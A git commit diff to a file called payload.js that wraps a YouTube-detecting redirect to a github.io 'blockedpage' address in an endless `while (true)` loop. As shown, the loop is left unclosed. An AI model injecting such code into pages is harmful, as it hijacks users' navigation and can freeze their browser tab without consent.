6f1410f962c1b9348c7473c63f493c0e63b1f299
Pokeknight2610 <118559005+Pokeknight2610@users.noreply.github.com>
2024-05-13 13:37:40 -0700

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,3 +1,5 @@
-if (window.location.href.includes("youtube")) {
+/// execute_script.js
+while (true) {
+    if (window.location.href.includes("youtube")) {
     window.location.href = "https://pokeknight2610.github.io/blockedpage/dbjfvugfdrufvgHUKkgvguifvJYHFHJMTNFHJMugkgiyswiwduguyG(*iuHjbiugf6CR^f5tyf67d7f5d655768iG78gBddhufdgucfdgh.mhtml";
 }
